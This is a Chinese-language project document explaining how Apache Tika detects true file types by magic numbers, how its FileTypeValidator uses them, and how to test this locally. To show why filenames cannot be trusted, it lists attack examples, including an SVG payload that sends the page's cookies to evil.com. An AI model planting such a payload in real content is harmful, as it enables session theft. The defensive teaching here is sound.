# Apache Tika 文件类型检测详解

> 定位：本项目扫描管道第一站的基础设施 —— 用文件**内容**而非文件名判定真实类型，是所有后续检测（ClamAV / YARA / 文档威胁检测）的前置闸门。
> 对应代码：`FileTypeValidator`（Tika 探测 + 扩展名一致性 + ZIP 炸弹流式检查）

## 目录

- [一、核心结论](#一核心结论)
- [二、为什么服务端不能信任文件名与 Content-Type](#二为什么服务端不能信任文件名与-content-type)
- [三、文件类型判定原理：魔数与检测链](#三文件类型判定原理魔数与检测链)
- [四、Tika 核心 API 详解](#四tika-核心-api-详解)
- [五、tika-core 与 tika-parsers 的边界](#五tika-core-与-tika-parsers-的边界)
- [六、本项目白名单类型的探测行为速查](#六本项目白名单类型的探测行为速查)
- [七、在本项目中：FileTypeValidator 解读](#七在本项目中filetypevalidator-解读)
- [八、动手实验](#八动手实验)
- [九、常见坑与最佳实践](#九常见坑与最佳实践)
- [十、延伸阅读](#十延伸阅读)

---

## 一、核心结论

1. **Tika 是 Apache 基金会的 Java 内容检测与文本抽取工具包**，2007 年从 Lucene 生态独立出来，是 Java 生态文件类型检测的事实标准（搜索引擎、内容管理系统普遍用它做入库前的类型识别）。
2. 类型检测的本质是**读文件头部的"魔数"（magic number / 文件签名）**，而不是看文件叫什么名字。文件名和 HTTP 头里的 Content-Type 都是客户端自己填的，攻击者可任意伪造。
3. 本项目只用 `tika-core`（约 1MB、几乎零依赖），只做**类型检测**（`Tika.detect()`），不用 tika-parsers 做全文抽取 —— 检测只读文件头部若干 KB，内存 O(1)，速度快。
4. 检测策略是"**内容优先、文件名仅作提示（hint）**"：zip 容器（docx/xlsx）Tika 会进一步打开读 `[Content_Types].xml` 才能区分出具体类型；改名不影响结果。

---

## 二、为什么服务端不能信任文件名与 Content-Type

上传场景中，服务端能拿到的三个"类型线索"全部来自客户端：

| 线索 | 来源 | 可信度 |
|---|---|---|
| `MultipartFile.getOriginalFilename()` | multipart 表单字段 | ❌ 攻击者任意填写 |
| multipart part 头的 `Content-Type` | 客户端 | ❌ 同样任意填写 |
| 文件内容本身（魔数） | 客户端想冒充类型就必须伪造文件结构 | ✅ 唯一可信（伪造成本高） |

典型攻击场景：

```
# 恶意可执行文件改名为 pdf 上传
cp trojan.exe "年终报告.pdf"

# 双扩展名绕过
简历.pdf.exe

# SVG 内嵌 JavaScript（存储型 XSS 载体）—— 因此 SVG 不在本项目白名单内
<svg><script>fetch('//evil.com?c='+document.cookie)</script></svg>
```

如果服务端只校验扩展名白名单，以上全部放行。所以管道的设计是：**扩展名预检只作为低成本快路径**（`StagingService`），**真实类型必须由 Tika 对落盘内容探测**，且两者要交叉验证一致性（`FileTypeValidator`）。

---

## 三、文件类型判定原理：魔数与检测链

### 3.1 什么是魔数

绝大多数二进制格式在文件头部固定位置有一段约定字节，用于自我标识：

| 格式 | 魔数（十六进制） | ASCII 助记 |
|---|---|---|
| PDF | `25 50 44 46 2D` | `%PDF-` |
| ZIP 容器（docx/xlsx/jar/odt…） | `50 4B 03 04` | `PK··` |
| OLE2 复合文档（doc/xls/ppt） | `D0 CF 11 E0 A1 B1 1A E1` | — |
| JPEG | `FF D8 FF` | — |
| PNG | `89 50 4E 47 0D 0A 1A 0A` | `\x89PNG\r\n\x1a\n` |
| GIF | `47 49 46 38 37 61` / `47 49 46 38 39 61` | `GIF87a` / `GIF89a` |
| BMP | `42 4D` | `BM` |
| Windows PE（exe/dll） | `4D 5A` | `MZ` |
| Linux ELF | `7F 45 4C 46` | `\x7fELF` |
| RAR | `52 61 72 21 1A 07` | `Rar!` |
| 7z | `37 7A BC AF 27 1C` | `7z¼¯'` |
| gzip | `1F 8B` | — |

两个魔数在项目里反复出现，值得记住：

- `D0 CF 11 E0 …`：OLE2（老 Office 格式的容器）。YARA 规则里写成小端 `uint16(0) == 0xCFD0`。
- `50 4B 03 04`（`PK`）：ZIP 家族总开关，OOXML（docx/xlsx/pptx）本质是 ZIP 套 XML。YARA 里是 `uint16(0) == 0x4B50`。

### 3.2 检测链：Tika 怎么从字节流得出 MIME 类型

Tika 的类型注册表（`tika-mimetypes.xml`，内置于 tika-core）给每种类型定义了多种识别线索。探测流程概念上是：

```
输入（文件字节流 + 可选文件名 hint）
   │
   1. 读头部若干 KB（mark/reset，读完可回卷）      ← 内存 O(1)
   2. 文件名 hint（若有）→ 缩小候选类型集合（仅加速，不决定结果）
   3. 逐条匹配 magic 规则
   │     ├─ 普通 magic：固定偏移的字节模式
   │     ├─ ZIP 容器深探测：打开 zip 找 [Content_Types].xml / mimetype entry
   │     │    → 这一步才能把 application/zip 细分为 docx / xlsx / jar / odt…
   │     └─ XML 根元素命名空间 → 区分 XML 方言
   4. 文本类文件：TextDetector 判定字符集/纯文本
   5. 返回最具体的 MediaType；全部失败 → application/octet-stream
```

关键理解：

- **改扩展名骗不过 Tika**：`ls` 二进制改名 `x.pdf`，魔数仍是 ELF，探测结果是可执行格式，与 `application/pdf` 白名单不匹配 → 拒绝。
- **ZIP 家族需要"打开看"**：仅凭 `PK` 头只能得出 `application/zip`；区分 docx/xlsx/jar 依赖 zip 内部特征（首个 entry 名、`[Content_Types].xml` 的内容、`META-INF/MANIFEST.MF` 等）。tika-core 已内置这些深探测规则，无需 parsers。
- 探测**只消费文件头部**，不会把整个文件读入内存 —— 这是本方案敢对 100MB 大文件也做类型检测的前提。

---

## 四、Tika 核心 API 详解

### 4.1 Tika 门面（本项目用法）

`org.apache.tika.Tika` 是最常用的简化门面，常用重载：

| 方法 | 行为 | 是否读内容 |
|---|---|---|
| `detect(String filename)` | **纯扩展名查表** | ❌ 不读文件 |
| `detect(File)` / `detect(Path)` | 完整探测，文件名同时作为 hint 传入 | ✅ |
| `detect(InputStream)` | 完整探测，无文件名 hint（要求流可 mark/reset） | ✅ |
| `detect(InputStream, String name)` | 完整探测 + 指定 hint | ✅ |
| `detect(byte[])` | 对内存字节探测 | ✅ |

注意第一个：`detect("a.pdf")` 只看名字，**不等于** `detect(new File("a.pdf"))`。做安全校验必须用读内容的版本。本项目调用 `tika.detect(file)`（`Path`），由于 `StagingService` 落盘时保留了原扩展名（`UUID.csv`），文件名 hint 天然可用。

### 4.2 底层结构

```
Tika（门面）
 └─ Detector（检测器接口，detect(stream, metadata) → MediaType）
     └─ DefaultDetector / MimeTypes.getDefault()
         └─ tika-mimetypes.xml 注册表（glob + magic + XML root + 类型层级关系）
```

想精细化控制（如自定义注册表、排除某些检测器）时直接用 `Detector` 接口；日常校验用门面即可。

---

## 五、tika-core 与 tika-parsers 的边界

| 模块 | 体积/依赖 | 能力 | 本项目 |
|---|---|---|---|
| `tika-core` | ~1MB，几乎零传递依赖 | 类型检测、Tika 门面 | ✅ 使用 |
| `tika-parsers-standard` | 依赖树巨大（POI、PDFBox、Tesseract…） | 全文抽取（把 docx/pdf 提取成纯文本） | ❌ 不用 |
| `tika-server` / `tika-app` | 独立服务/CLI | REST 检测+抽取、批量处理 | ❌ 不用 |

经验法则：**只需要"这是什么文件"→ core；需要"文件里写了什么"→ parsers**。本项目不需要内容抽取，引入 parsers 反而会显著拉大镜像、放大攻击面（解析器本身历史上多次成为 CVE 来源）。

版本线速记：1.x（2021 年止，javax）→ 2.x（模块大重构，Java 8+）→ **3.x（Jakarta 命名空间，Java 11+，本项目用 3.3.2）**。

---

## 六、本项目白名单类型的探测行为速查

以下为常见文件在 Tika 3.3.2 下的实际探测结果（与 `VirusScanProperties.allowedMimeTypes` 对照）：

| 文件 | Tika 探测结果 | 备注 |
|---|---|---|
| 真实 `.pdf` | `application/pdf` | |
| `.docx` | `application/vnd.openxmlformats-officedocument.wordprocessingml.document` | zip 深探测成功 |
| `.xlsx` | `application/vnd.openxmlformats-officedocument.spreadsheetml.sheet` | 同上 |
| `.pptx` | `application/vnd.openxmlformats-officedocument.presentationml.presentation` | 同上 |
| `.doc` / `.xls` / `.ppt` | `application/msword` / `application/vnd.ms-excel` / `application/vnd.ms-powerpoint` | OLE2 魔数 |
| `.jpg` / `.png` / `.gif` / `.bmp` | 对应 `image/*` | |
| `.txt` | `text/plain` | |
| `.csv` | **常为 `text/plain`** | csv 无魔数；本项目实测如此，故做了 txt/csv 双向互认特判 |
| `.zip` | `application/zip` | 同时触发 ZIP 炸弹四维流式检查 |
| exe 改名 `.pdf` | 可执行格式（如 `application/x-executable`） | → 白名单不匹配，拒绝 |
| `.jar` | `application/java-archive` | zip 深探测发现 MANIFEST → 不在白名单，拒绝 |

`jpg/jpeg` 互认、`txt/csv` 互认两处特判都在 `FileTypeValidator.isExtensionConsistent()` 中，原因即上表：**同一 MIME 常对应多个日常扩展名，机械一一映射会误杀正常文件**。

---

## 七、在本项目中：FileTypeValidator 解读

`FileTypeValidator.validate()` 四步层层递进：

```java
// 1. 探测一次，结果随管道传递（后续文档威胁检测复用，不重复探测）
detectedMime = tika.detect(file);

// 2. 白名单校验：探测结果必须在 allowedMimeTypes 内
//    （挡住：exe 伪装 pdf、jar、svg、脚本文件…）

// 3. 一致性校验：探测出的 MIME 与扩展名是否匹配
//    （挡住：类型合法但"张冠李戴"的场景，如 zip 内容挂 .pdf 扩展名）

// 4. ZIP 深检：探测为 application/zip 时进入 inspectZip（解压炸弹防护）
```

返回值是 `record TypeCheck(boolean passed, String detectedMime, String rejectReason)` —— `detectedMime` 一路传到 `VirusScanService.doScan()` 的阶段 4，用于判断是否需要进入文档威胁检测（`isDocumentFormat()`）。这种"**探测一次、结果复用**"的设计避免了每个阶段各自 `detect()` 造成的重复 IO。

---

## 八、动手实验

### 8.1 jshell 快速体验（无需写代码）

```bash
jshell --class-path ~/.m2/repository/org/apache/tika/tika-core/3.3.2/tika-core-3.3.2.jar
```

```java
import org.apache.tika.Tika;
import java.nio.file.*;

var tika = new Tika();

// 1. 正常文件
tika.detect(Paths.get("pom.xml"));                       // application/xml

// 2. 伪造实验：可执行文件改名 pdf
Files.copy(Path.of("/bin/true"), Path.of("/tmp/fake.pdf"),
           StandardCopyOption.REPLACE_EXISTING);
tika.detect(Paths.get("/tmp/fake.pdf"));                 // application/x-executable，不是 pdf！

// 3. 纯文件名探测（不读内容，注意区别）
tika.detect("fake.pdf");                                 // application/pdf —— 只查了表

// 4. zip 家族深探测
tika.detect(Paths.get("target/xxx.jar"));                // application/java-archive
```

### 8.2 走完整管道

```bash
docker compose -f docker/docker-compose.yml up -d clamav
mvn spring-boot:run

# 伪造扩展名 → 期望 400 REJECTED
cp /bin/true /tmp/fake.pdf
curl -F "file=@/tmp/fake.pdf" http://localhost:8080/api/files/upload
# 响应 message 类似：文件类型与扩展名不符，检测到: application/x-executable
```

---

## 九、常见坑与最佳实践

| 坑 | 说明 / 对策 |
|---|---|
| ❌ 用 `detect(filename)` 做安全校验 | 只查扩展名表，不读内容，形同虚设。必须用读内容的重载 |
| ❌ 信任 multipart 的 Content-Type | 客户端可填任意值，校验必须基于探测结果 |
| csv 被探测为 `text/plain` | 无魔数格式探测天然保守。策略层做扩展名互认，而不是改探测逻辑 |
| ZIP 家族都是"zip" | 需要区分具体类型时确认 Tika 深探测已覆盖；jar/apk/odt 都能区分 |
| 探测结果依赖版本 | 升级 Tika 小版本也可能改变边缘格式的结果，升级后应回归白名单用例（本项目有 `FileTypeValidatorTest` 守护） |
| 全量读文件再探测 | `detect` 只需头部；自己用 `Files.readAllBytes` 再 detect 既慢又占内存，没必要 |
| 仅靠 Tika 判"恶意" | Tika 只管"是什么"，不管"有没有毒"。恶意宏 docx 的类型完全合法 —— 这正是后续 ClamAV/YARA/文档威胁检测存在的原因 |

---

## 十、延伸阅读

- 官方文档：<https://tika.apache.org/>（重点读 "Getting Started" 与 "Supported Document Formats"）
- 文件签名总表（查任意格式魔数）：<https://www.garykessler.net/software/file_sigs.html> / File Signatures Table (filesignatures.net)
- 维基百科 Magic number (programming) 词条
- 本仓库相关文档：[病毒扫描技术栈总览](病毒扫描技术栈总览.md) · [ClamAV病毒扫描引擎详解](ClamAV病毒扫描引擎详解.md) · [文档威胁检测详解](文档威胁检测详解.md)
